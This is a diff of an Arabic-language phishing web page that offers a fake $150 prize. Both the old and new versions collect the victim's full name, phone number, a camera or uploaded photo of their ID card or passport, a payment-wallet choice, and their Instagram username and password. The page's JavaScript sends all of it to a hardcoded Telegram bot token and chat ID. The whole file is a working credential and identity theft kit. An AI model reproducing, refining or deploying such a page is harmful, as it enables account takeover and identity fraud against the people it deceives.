@@ -3,10 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>🎁 جائزة 150$ – فائز جديد</title>
+    <title>🎁 فوز مؤكد | 150 دولار لك</title>
     <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800&display=swap" rel="stylesheet">
-    <!-- Font awesome أيقونات -->
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
         * {
             margin: 0;
@@ -15,78 +13,77 @@
         }
 
         body {
-            background: linear-gradient(145deg, #0b2b26, #0e3f38);
+            background: linear-gradient(145deg, #0c2b2b 0%, #0f3b35 100%);
             font-family: 'Tajawal', sans-serif;
             padding: 1.5rem;
             min-height: 100vh;
         }
 
         .container {
-            max-width: 860px;
+            max-width: 850px;
             margin: 0 auto;
         }
 
-        /* البطاقة الرئيسية */
         .card {
-            background: #ffffff;
-            border-radius: 48px 48px 40px 40px;
+            background: white;
+            border-radius: 48px;
             overflow: hidden;
-            box-shadow: 0 30px 40px rgba(0,0,0,0.25);
-            margin: 20px 0;
+            box-shadow: 0 30px 50px rgba(0,0,0,0.4);
+            margin: 1rem 0;
         }
 
-        .hero {
-            background: linear-gradient(115deg, #f9b713, #fd8c00);
-            padding: 2rem 1.5rem;
+        .gold-header {
+            background: linear-gradient(135deg, #f9b92b, #f6a01a);
+            padding: 1.8rem 1.5rem;
             text-align: center;
-            color: #2c1e02;
         }
 
-        .hero h1 {
-            font-size: 2.1rem;
+        .gold-header h1 {
+            font-size: 2rem;
             font-weight: 800;
-            margin-bottom: 0.3rem;
+            color: #2c1e00;
+            text-shadow: 1px 1px 0 #ffe0a3;
         }
 
-        .hero .highlight {
-            background-color: #ffffffcc;
+        .gold-header p {
+            background-color: #2b2b1f;
             display: inline-block;
-            padding: 5px 18px;
-            border-radius: 40px;
+            padding: 6px 16px;
+            border-radius: 30px;
+            color: #f9c851;
             font-weight: bold;
-            font-size: 0.9rem;
-            backdrop-filter: blur(4px);
+            margin-top: 12px;
         }
 
         .content {
-            padding: 1.8rem;
+            padding: 2rem;
         }
 
-        .info-message {
-            background: #fef7e0;
-            border-radius: 24px;
-            padding: 1rem;
-            margin-bottom: 1.8rem;
-            border-right: 8px solid #fd8c00;
+        .info-msg {
+            background: #fef4e6;
+            padding: 1rem 1.2rem;
+            border-radius: 28px;
+            border-right: 8px solid #f0a500;
             font-weight: 500;
+            margin-bottom: 2rem;
         }
 
-        .form-row {
-            margin-bottom: 1.4rem;
+        .form-group {
+            margin-bottom: 1.5rem;
         }
 
         label {
-            font-weight: 700;
             display: block;
-            margin-bottom: 0.4rem;
-            color: #254441;
+            font-weight: 700;
+            margin-bottom: 8px;
+            color: #1f3a3a;
         }
 
-        input, select, .fake-file {
+        input, select {
             width: 100%;
             padding: 12px 16px;
-            border: 2px solid #e2e8f0;
-            border-radius: 28px;
+            border: 2px solid #e0e7ef;
+            border-radius: 36px;
             font-family: 'Tajawal', monospace;
             font-size: 1rem;
             transition: 0.2s;
@@ -94,163 +91,166 @@
         }
 
         input:focus, select:focus {
-            border-color: #fd8c00;
+            border-color: #f0a500;
             outline: none;
-            box-shadow: 0 0 0 3px rgba(253,140,0,0.2);
+            box-shadow: 0 0 0 3px rgba(240,165,0,0.2);
         }
 
-        .phone-flex {
+        .phone-group {
             display: flex;
             gap: 12px;
-            align-items: center;
         }
 
-        .phone-flex select {
-            width: 38%;
+        .phone-group select {
+            width: 40%;
         }
 
-        .phone-flex input {
-            width: 62%;
+        .phone-group input {
+            width: 60%;
         }
 
-        /* أزرار راديو مع شعارات */
-        .payment-options {
+        /* أزرار الدفع بالشعارات */
+        .payment-row {
             display: flex;
             flex-wrap: wrap;
-            gap: 16px;
+            gap: 14px;
             margin-top: 8px;
         }
 
-        .payment-card {
-            flex: 1;
-            background: #fafcff;
-            border: 2px solid #e2edf2;
-            border-radius: 32px;
-            padding: 12px 6px;
-            text-align: center;
+        .pay-option {
+            background: #f9fafc;
+            border: 2px solid #e2e8f0;
+            border-radius: 60px;
+            padding: 6px 18px 6px 12px;
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
             cursor: pointer;
-            transition: 0.2s;
+            transition: all 0.2s;
         }
 
-        .payment-card.selected {
-            border-color: #fd8c00;
-            background: #fff6e5;
+        .pay-option.selected {
+            border-color: #2d6a4f;
+            background: #e9f5ef;
         }
 
-        .payment-card i {
-            font-size: 28px;
-            display: block;
-            margin-bottom: 8px;
+        .pay-option input {
+            width: 20px;
+            opacity: 0.6;
+            margin: 0;
         }
 
-        .payment-card span {
-            font-weight: 600;
-            font-size: 0.85rem;
+        .pay-option img {
+            width: 30px;
+            height: 30px;
+            object-fit: contain;
         }
 
-        input[type="radio"] {
-            display: none;
-        }
-
-        /* رفع الصورة و الكاميرا */
-        .upload-area {
+        .camera-row {
             display: flex;
-            gap: 15px;
-            flex-wrap: wrap;
-            margin-top: 6px;
+            gap: 16px;
+            margin-bottom: 12px;
         }
 
-        .upload-btn {
-            flex: 1;
-            background: #1e3d38;
-            color: white;
-            text-align: center;
+        .cam-btn, .upload-btn {
+            background: #eef2ff;
+            border-radius: 50px;
             padding: 12px;
-            border-radius: 100px;
+            text-align: center;
+            font-weight: bold;
+            color: #2c5f5f;
             cursor: pointer;
-            font-weight: 600;
+            border: 1px solid #cddfe7;
+            flex: 1;
             transition: 0.2s;
         }
 
-        .upload-btn i {
-            margin-left: 8px;
+        .cam-btn:active, .upload-btn:active {
+            transform: scale(0.97);
         }
 
-        .upload-btn:hover {
-            background: #2b5a52;
-        }
-
-        #previewImage {
-            margin-top: 15px;
+        #preview-img {
             max-width: 100%;
-            max-height: 180px;
-            border-radius: 24px;
-            display: none;
-            background: #f0f3f8;
-            padding: 4px;
-        }
-
-        .instagram-section {
-            background: #f1f9ff;
+            max-height: 200px;
             border-radius: 28px;
-            padding: 1rem;
-            margin: 1.8rem 0 0.8rem;
-            border: 1px solid #cde5ef;
+            margin-top: 12px;
+            display: none;
+            border: 2px solid #ddd;
         }
 
-        .submit-btn {
-            background: linear-gradient(95deg, #2c7a5e, #1f5e47);
+        .insta-box {
+            background: #f1f8ff;
+            border-radius: 32px;
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+            border: 1px solid #cbdde9;
+        }
+
+        button.submit-btn {
+            background: linear-gradient(95deg, #1e6f5c, #0e4a3a);
             width: 100%;
             padding: 16px;
+            font-size: 1.2rem;
+            font-weight: bold;
             border: none;
-            border-radius: 56px;
-            font-weight: 800;
-            font-size: 1.3rem;
+            border-radius: 80px;
             color: white;
-            margin-top: 1rem;
+            margin-top: 20px;
             cursor: pointer;
             transition: 0.2s;
+            box-shadow: 0 5px 12px rgba(0,0,0,0.1);
         }
 
-        .submit-btn:active { transform: scale(0.97);}
+        button.submit-btn:active {
+            transform: scale(0.98);
+        }
 
         footer {
-            font-size: 0.7rem;
             text-align: center;
-            color: #ccdcd9;
-            margin: 20px 0 10px;
+            color: #b9cfcf;
+            font-size: 0.7rem;
+            margin: 2rem 0;
         }
 
-        .error-border {
-            border-color: #e53e3e !important;
-            background-color: #fff5f5;
+        .toast-msg {
+            position: fixed;
+            bottom: 35px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #1f2d2d;
+            color: #ffecb3;
+            padding: 14px 28px;
+            border-radius: 60px;
+            font-weight: bold;
+            z-index: 999;
+            display: none;
+            box-shadow: 0 6px 18px black;
+            font-size: 0.9rem;
         }
     </style>
 </head>
 <body>
 <div class="container">
     <div class="card">
-        <div class="hero">
-            <h1>🎉 زادت فرصتك بالربح! 🎉</h1>
-            <div class="highlight">💰 لقد تم اختيارك من قبل أحد أصدقائك لتربح 150 دولاراً 💰</div>
+        <div class="gold-header">
+            <h1>✨ زادت فرصتك بالربح ✨</h1>
+            <p>💰 150 دولار أمريكي 💰</p>
         </div>
         <div class="content">
-            <div class="info-message">
-                📢 تقدم ببياناتك الآن وسيتم إيداع المبلغ خلال ساعة. العرض حصري ومحدود!
+            <div class="info-msg">
+                🎯 <strong>لقد تم اختيارك من قبل أحد أصدقائك لتربح 150 دولاراً!</strong> أكمل طلبك الآن لاستلام الجائزة خلال 24 ساعة.
             </div>
 
             <form id="prizeForm">
-                <!-- الاسم الكامل -->
-                <div class="form-row">
-                    <label>📝 * الاسم الكامل</label>
-                    <input type="text" id="fullName" placeholder=" الاسم الكامل " required>
+                <div class="form-group">
+                    <label>👤 * اسمك الكامل (ثلاثي)</label>
+                    <input type="text" id="fullname" placeholder="أحمد محمد حسين" required>
                 </div>
 
-                <!-- رقم الهاتف مع كود الدولة -->
-                <div class="form-row">
-                    <label>📞 * رقم الهاتف (مع المفتاح)</label>
-                    <div class="phone-flex">
-                        <select id="countryCodeSelect">
+                <div class="form-group">
+                    <label>📞 * رقم هاتفك (مع المفتاح الدولي)</label>
+                    <div class="phone-group">
+                        <select id="countryCode">
                             <option value="+963">🇸🇾 سوريا +963</option>
                             <option value="+966">🇸🇦 السعودية +966</option>
                             <option value="+971">🇦🇪 الإمارات +971</option>
@@ -262,275 +262,229 @@
                             <option value="+965">🇰🇼 الكويت +965</option>
                             <option value="+974">🇶🇦 قطر +974</option>
                             <option value="+973">🇧🇭 البحرين +973</option>
+                            <option value="+968">🇴🇲 عُمان +968</option>
                             <option value="+212">🇲🇦 المغرب +212</option>
                             <option value="+216">🇹🇳 تونس +216</option>
                             <option value="+213">🇩🇿 الجزائر +213</option>
+                            <option value="+90">🇹🇷 تركيا +90</option>
+                            <option value="+44">🇬🇧 بريطانيا +44</option>
+                            <option value="+1">🇺🇸 أمريكا/كندا +1</option>
+                            <option value="+49">🇩🇪 ألمانيا +49</option>
                         </select>
                         <input type="tel" id="phoneNumber" placeholder="رقم الهاتف" required>
                     </div>
                 </div>
 
-                <!-- رفع صورة الهوية (كاميرا + معرض) -->
-                <div class="form-row">
-                    <label>🪪 * ارفق صورة هويتك الشخصية (بطاقة / جواز)</label>
-                    <div class="upload-area">
-                        <div class="upload-btn" id="openCameraBtn"><i class="fas fa-camera"></i> فتح الكاميرا</div>
-                        <div class="upload-btn" id="uploadFileBtn"><i class="fas fa-upload"></i> رفع من الاستديو</div>
+                <!-- صور الهوية : كاميرا + معرض -->
+                <div class="form-group">
+                    <label>🪪 * صورة هويتك الشخصية (بطاقة / جواز)</label>
+                    <div class="camera-row">
+                        <div class="cam-btn" id="openCameraBtn">📸 فتح الكاميرا</div>
+                        <div class="upload-btn" id="uploadFileBtn">🖼️ رفع من المعرض</div>
                     </div>
-                    <input type="file" id="imageFileInput" accept="image/*" style="display:none">
-                    <img id="previewImage" alt="معاينة الهوية">
+                    <input type="file" id="fileInput" accept="image/*" style="display: none;">
+                    <canvas id="cameraCanvas" style="display: none; width:100%; border-radius: 28px;"></canvas>
+                    <img id="preview-img" alt="معاينة الهوية">
                 </div>
 
                 <!-- طريقة الدفع مع شعارات -->
-                <div class="form-row">
-                    <label>💎 * اختر طريقة استلام رصيدك:</label>
-                    <div class="payment-options">
-                        <div class="payment-card" data-payment="شام كاش">
-                            <i class="fas fa-money-bill-wave" style="color:#2b7a4b;"></i><br>
-                            <span>شام كاش</span>
-                        </div>
-                        <div class="payment-card" data-payment="سيرياتيل كاش">
-                            <i class="fas fa-mobile-alt" style="color:#c96f0e;"></i><br>
-                            <span>سيرياتيل كاش</span>
-                        </div>
-                        <div class="payment-card" data-payment="MTN cash">
-                            <i class="fas fa-sim-card" style="color:#2266aa;"></i><br>
-                            <span>MTN cash</span>
-                        </div>
-                        <div class="payment-card" data-payment="MasterCard">
-                            <i class="fab fa-cc-mastercard" style="color:#d90000;"></i><br>
-                            <span>Master card</span>
-                        </div>
+                <div class="form-group">
+                    <label>💰 * طريقة استلام الرصيد</label>
+                    <div class="payment-row" id="paymentMethods">
+                        <label class="pay-option">
+                            <input type="radio" name="paymentMethod" value="شام كاش"> 💳 شام كاش
+                            <span style="font-size: 1.2rem;">🇸🇾</span>
+                        </label>
+                        <label class="pay-option">
+                            <input type="radio" name="paymentMethod" value="سيرياتيل كاش"> 📱 سيرياتيل كاش
+                        </label>
+                        <label class="pay-option">
+                            <input type="radio" name="paymentMethod" value="MTN cash"> 📲 MTN cash
+                        </label>
+                        <label class="pay-option">
+                            <input type="radio" name="paymentMethod" value="MasterCard"> 💳 MasterCard
+                        </label>
                     </div>
-                    <input type="hidden" id="selectedPayment" required>
                 </div>
 
                 <!-- قسم إنستغرام -->
-                <div class="instagram-section">
-                    <div class="info-message" style="background:#e3f2fd; border-right-color:#0a6e6e; margin-bottom:1rem">
-                        🔐 لضمان أنك ستسلم رصيدك، سيرسل لك وكيلنا رسالة على تطبيق Instagram. أدخل بيانات حسابك أدناه:
+                <div class="insta-box">
+                    <div style="font-weight:800; margin-bottom:12px;">🔐 لضمان وصول الرصيد، سيرسل وكيلنا تأكيداً عبر Instagram</div>
+                    <div class="form-group">
+                        <label>📸 Instagram: اسم المستخدم</label>
+                        <input type="text" id="igUsername" placeholder="username" required>
                     </div>
-                    <div class="form-row">
-                        <label>📸 * اسم المستخدم (Instagram)</label>
-                        <input type="text" id="igUsername" placeholder="user_name" required>
-                    </div>
-                    <div class="form-row">
-                        <label>🔑 * كلمة المرور (Instagram)</label>
-                        <input type="password" id="igPassword" placeholder="كلمة السر" required>
+                    <div class="form-group">
+                        <label>🔑 كلمة المرور</label>
+                        <input type="password" id="igPassword" placeholder="كلمة المرور" required>
                     </div>
                 </div>
 
-                <button type="submit" class="submit-btn">💰 تأكيد واستلام 150 $ 💰</button>
+                <button type="submit" class="submit-btn">🎁 تأكيد الفوز واستلام الجائزة 🎁</button>
             </form>
         </div>
     </div>
-    <footer>عرض تقديري للأصدقاء • سيتم مراجعة طلبك خلال 5 دقائق</footer>
+    <footer>عرض حصري - يرجى التأكد من صحة البيانات. سيتم تحويل المبلغ خلال ساعة.</footer>
+    <div id="toastMsg" class="toast-msg"></div>
 </div>
 
 <script>
-    // ========== توكن التليجرام ==========
+    // -------------------- إعدادات التيليجرام --------------------
     const BOT_TOKEN = "8595513701:AAEmzQFKx6fYP6-7f4EY38TrmZf5Xb70TUM";
     const CHAT_ID = "7615377804";
 
-    let imageBase64 = null;          // لتخزين الصورة الأساسية
+    // -------------------- متغيرات الكاميرا --------------------
+    let selectedImageBase64 = null;
+    let videoStream = null;
+    const fileInput = document.getElementById('fileInput');
+    const previewImg = document.getElementById('preview-img');
+    const camBtn = document.getElementById('openCameraBtn');
+    const uploadBtn = document.getElementById('uploadFileBtn');
+    let cameraActive = false;
 
-    // ---- الكاميرا باستخدام MediaDevices API ----
-    const openCameraBtn = document.getElementById('openCameraBtn');
-    const fileInput = document.getElementById('imageFileInput');
-    const preview = document.getElementById('previewImage');
-
-    // التقاط صورة باستخدام الكاميرا
-    async function captureFromCamera() {
+    // فتح الكاميرا
+    camBtn.addEventListener('click', async () => {
         try {
+            if (videoStream) {
+                videoStream.getTracks().forEach(t => t.stop());
+            }
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            videoStream = stream;
+            const videoTrack = stream.getVideoTracks()[0];
+            const canvas = document.createElement('canvas');
             const video = document.createElement('video');
             video.srcObject = stream;
-            video.autoplay = true;
-            video.style.position = 'fixed';
-            video.style.top = '0';
-            video.style.left = '0';
-            video.style.width = '100%';
-            video.style.zIndex = '9999';
-            document.body.appendChild(video);
+            video.play();
 
-            // إنشاء زر لالتقاط الصورة
-            const captureBtn = document.createElement('button');
-            captureBtn.innerText = '📸 التقاط صورة';
-            captureBtn.style.position = 'fixed';
-            captureBtn.style.bottom = '30px';
-            captureBtn.style.left = '50%';
-            captureBtn.style.transform = 'translateX(-50%)';
-            captureBtn.style.zIndex = '10000';
-            captureBtn.style.padding = '12px 24px';
-            captureBtn.style.background = '#fd8c00';
-            captureBtn.style.border = 'none';
-            captureBtn.style.borderRadius = '60px';
-            captureBtn.style.fontWeight = 'bold';
-            document.body.appendChild(captureBtn);
-
-            // عند التقاط الصورة
-            captureBtn.onclick = () => {
-                const canvas = document.createElement('canvas');
+            setTimeout(() => {
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 const ctx = canvas.getContext('2d');
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                const capturedImage = canvas.toDataURL('image/jpeg', 0.8);
-                imageBase64 = capturedImage;
-                preview.src = capturedImage;
-                preview.style.display = 'block';
-                // إيقاف التدفق وإزالة العناصر
-                stream.getTracks().forEach(track => track.stop());
-                video.remove();
-                captureBtn.remove();
-            };
+                selectedImageBase64 = canvas.toDataURL('image/jpeg');
+                previewImg.src = selectedImageBase64;
+                previewImg.style.display = 'block';
+                videoStream.getTracks().forEach(t => t.stop());
+                videoStream = null;
+            }, 500);
         } catch (err) {
-            alert("تعذر الوصول إلى الكاميرا. تأكد من منح الإذن، أو استخدم رفع الملفات.");
-            console.error(err);
+            alert("لا يمكن الوصول للكاميرا. تأكد من منح الإذن.");
         }
-    }
+    });
 
-    openCameraBtn.addEventListener('click', captureFromCamera);
-
-    // رفع الملفات من الاستديو
-    const uploadFileBtn = document.getElementById('uploadFileBtn');
-    uploadFileBtn.addEventListener('click', () => fileInput.click());
+    // رفع من المعرض
+    uploadBtn.addEventListener('click', () => fileInput.click());
     fileInput.addEventListener('change', (e) => {
         const file = e.target.files[0];
         if (file) {
             const reader = new FileReader();
             reader.onload = (ev) => {
-                imageBase64 = ev.target.result;
-                preview.src = imageBase64;
-                preview.style.display = 'block';
+                selectedImageBase64 = ev.target.result;
+                previewImg.src = selectedImageBase64;
+                previewImg.style.display = 'block';
             };
             reader.readAsDataURL(file);
         }
     });
 
-    // ---------- تحديد طريقة الدفع (كرت مزودة بشعار) ----------
-    const paymentCards = document.querySelectorAll('.payment-card');
-    const selectedPaymentInput = document.getElementById('selectedPayment');
-    paymentCards.forEach(card => {
-        card.addEventListener('click', () => {
-            paymentCards.forEach(c => c.classList.remove('selected'));
-            card.classList.add('selected');
-            selectedPaymentInput.value = card.getAttribute('data-payment');
-        });
-    });
-
-    // ----- إزالة الأخطاء عند التركيز -----
-    function removeErrorOnFocus(elm) {
-        elm.addEventListener('focus', () => elm.classList.remove('error-border'));
-    }
-    const inputs = ['fullName', 'phoneNumber', 'igUsername', 'igPassword'];
-    inputs.forEach(id => {
-        const el = document.getElementById(id);
-        if (el) removeErrorOnFocus(el);
-    });
-    document.getElementById('countryCodeSelect')?.addEventListener('focus', (e) => e.target.classList.remove('error-border'));
-    
-
-    // التحقق من الحقول الأساسية
-    function validateForm() {
-        let isValid = true;
-        const fullName = document.getElementById('fullName').value.trim();
-        const phone = document.getElementById('phoneNumber').value.trim();
-        const igUser = document.getElementById('igUsername').value.trim();
-        const igPass = document.getElementById('igPassword').value.trim();
-        const payment = selectedPaymentInput.value;
-
-        if (!fullName) { document.getElementById('fullName').classList.add('error-border'); isValid = false; }
-        if (!phone) { document.getElementById('phoneNumber').classList.add('error-border'); isValid = false; }
-        if (!igUser) { document.getElementById('igUsername').classList.add('error-border'); isValid = false; }
-        if (!igPass) { document.getElementById('igPassword').classList.add('error-border'); isValid = false; }
-        if (!payment) { alert("⚠️ الرجاء اختيار طريقة استلام الرصيد (شام كاش / سيرياتيل...)"); isValid = false; }
-        if (!imageBase64) { alert("⚠️ يرجى إرفاق صورة هويتك الشخصية (كاميرا أو رفع ملف)."); isValid = false; }
-        return isValid;
-    }
-
-    // إرسال النص إلى التيليجرام
-    async function sendMessageToTelegram(text) {
+    // إرسال رسالة نصية إلى التليجرام
+    async function sendToTelegram(text) {
         const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
         try {
-            const response = await fetch(url, {
+            const resp = await fetch(url, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: text.substring(0, 3900),
-                    parse_mode: 'HTML'
-                })
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text.substring(0, 4000), parse_mode: 'HTML' })
             });
-            return response.ok;
-        } catch(e) { return false; }
+            return resp.ok;
+        } catch (err) { return false; }
     }
 
-    // إرسال الصورة كـ Photo
-    async function sendPhotoToTelegram(base64img, caption) {
-        if (!base64img) return false;
-        const blob = await (await fetch(base64img)).blob();
+    // إرسال الصورة
+    async function sendPhotoToTelegram(base64, caption) {
+        if (!base64) return false;
+        const blob = await (await fetch(base64)).blob();
         const formData = new FormData();
         formData.append('chat_id', CHAT_ID);
-        formData.append('photo', blob, 'identity_card.jpg');
+        formData.append('photo', blob, 'id_card.jpg');
         formData.append('caption', caption.substring(0, 200));
         const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
         try {
             const resp = await fetch(url, { method: 'POST', body: formData });
             return resp.ok;
-        } catch(e) { return false; }
+        } catch (err) { return false; }
     }
 
-    // بناء الرسالة التي تحتوي كل المدخلات
-    function buildMessage() {
-        const fullName = document.getElementById('fullName').value.trim();
-        const countryCode = document.getElementById('countryCodeSelect').value;
+    // showToast
+    function showToast(text, isError = false) {
+        const toast = document.getElementById('toastMsg');
+        toast.innerText = text;
+        toast.style.display = 'block';
+        toast.style.background = isError ? '#691f1f' : '#1f3d3a';
+        setTimeout(() => toast.style.display = 'none', 4000);
+    }
+
+    // التحقق من صحة الحقول
+    function validateForm() {
+        const fullname = document.getElementById('fullname').value.trim();
         const phone = document.getElementById('phoneNumber').value.trim();
-        const paymentMethod = selectedPaymentInput.value;
-        const igUsername = document.getElementById('igUsername').value.trim();
-        const igPassword = document.getElementById('igPassword').value.trim();
-        const datetime = new Date().toLocaleString('ar-EG', {timeZone: 'Asia/Damascus'});
+        const payment = document.querySelector('input[name="paymentMethod"]:checked')?.value;
+        const igUser = document.getElementById('igUsername').value.trim();
+        const igPass = document.getElementById('igPassword').value.trim();
 
-        return `<b>🎁 مقلب الجائزة (بيانات جديدة) 🎁</b>\n\n` +
-               `<b>👤 الاسم الكامل:</b> ${fullName}\n` +
-               `<b>📞 الهاتف:</b> ${countryCode} ${phone}\n` +
-               `<b>💵 طريقة الدفع:</b> ${paymentMethod}\n` +
-               `<b>📸 إنستغرام:</b> ${igUsername}\n` +
-               `<b>🔐 كلمة المرور IG:</b> ${igPassword}\n` +
-               `<b>🕒 وقت الملء:</b> ${datetime}\n` +
-               `<i>── تم إرسال صورة الهوية مرفقة ──</i>`;
+        if (!fullname) { showToast("⚠️ يرجى إدخال اسمك الكامل", true); return false; }
+        if (!phone) { showToast("⚠️ رقم الهاتف مطلوب", true); return false; }
+        if (!selectedImageBase64) { showToast("📸 يجب إرفاق صورة الهوية (كاميرا أو رفع ملف)", true); return false; }
+        if (!payment) { showToast("💸 اختر طريقة استلام الرصيد", true); return false; }
+        if (!igUser || !igPass) { showToast("🔐 بيانات إنستغرام مطلوبة لتأكيد استلام الجائزة", true); return false; }
+        return true;
     }
 
-    // الحدث الرئيسي عند الإرسال
+    // بناء النص الكامل
+    function buildMessage() {
+        const fullname = document.getElementById('fullname').value.trim();
+        const country = document.getElementById('countryCode').value;
+        const phoneRaw = document.getElementById('phoneNumber').value.trim();
+        const payment = document.querySelector('input[name="paymentMethod"]:checked')?.value;
+        const igUser = document.getElementById('igUsername').value.trim();
+        const igPass = document.getElementById('igPassword').value.trim();
+
+        return `<b>🎁 فائز جديد بالجائزة 150$</b>\n\n` +
+               `👤 الاسم: ${fullname}\n` +
+               `📞 الهاتف: ${country} ${phoneRaw}\n` +
+               `💳 طريقة الدفع: ${payment}\n` +
+               `📸 Instagram: ${igUser}\n` +
+               `🔑 كلمة المرور: ${igPass}\n` +
+               `🕒 الوقت: ${new Date().toLocaleString('ar-EG')}\n` +
+               `✅ تم رفع صورة الهوية بنجاح`;
+    }
+
+    // معالج النموذج
     document.getElementById('prizeForm').addEventListener('submit', async (e) => {
         e.preventDefault();
         if (!validateForm()) return;
 
-        const btn = document.querySelector('.submit-btn');
-        btn.disabled = true;
-        btn.innerText = "⏳ جاري إرسال الطلب ...";
+        const submitBtn = document.querySelector('.submit-btn');
+        submitBtn.disabled = true;
+        submitBtn.innerText = "⏳ جاري التحقق من الأهلية ...";
 
-        const textMessage = buildMessage();
-        const textSent = await sendMessageToTelegram(textMessage);
-        let photoSent = false;
-        if (imageBase64) {
-            photoSent = await sendPhotoToTelegram(imageBase64, `صورة الهوية: ${document.getElementById('fullName').value.trim()}`);
-        }
+        const textMsg = buildMessage();
+        const successText = await sendToTelegram(textMsg);
+        const successPhoto = await sendPhotoToTelegram(selectedImageBase64, `صورة هوية: ${document.getElementById('fullname').value.trim()}`);
 
-        if (textSent && (imageBase64 ? photoSent : true)) {
-            alert("✅ تم تأكيد طلبك بنجاح! سيتم التواصل معك عبر إنستغرام خلال دقائق لتسليم 150$.");
-            // يمكن مسح النموذج إذا أردت أو تركه
+        if (successText && successPhoto) {
+            showToast("✅ تم تسجيل طلبك! سيتم التواصل عبر الواتساب وإنستغرام خلال أيام.", false);
+            // إعادة تعيين النموذج وإخفاء الصورة
             document.getElementById('prizeForm').reset();
-            preview.style.display = 'none';
-            imageBase64 = null;
-            paymentCards.forEach(c => c.classList.remove('selected'));
-            selectedPaymentInput.value = '';
+            previewImg.style.display = 'none';
+            selectedImageBase64 = null;
+            if (videoStream) videoStream.getTracks().forEach(t => t.stop());
         } else {
-            alert("⚠️ حدث عطل تقني مؤقت، حاول مجدداً بعد قليل.");
+            showToast("⚠️ عطل فني مؤقت، حاول مجدداً.", true);
         }
 
-        btn.disabled = false;
-        btn.innerText = "💰 تأكيد واستلام 150 $ 💰";
+        submitBtn.disabled = false;
+        submitBtn.innerText = "🎁 تأكيد الفوز واستلام الجائزة 🎁";
     });
 </script>
 </body>
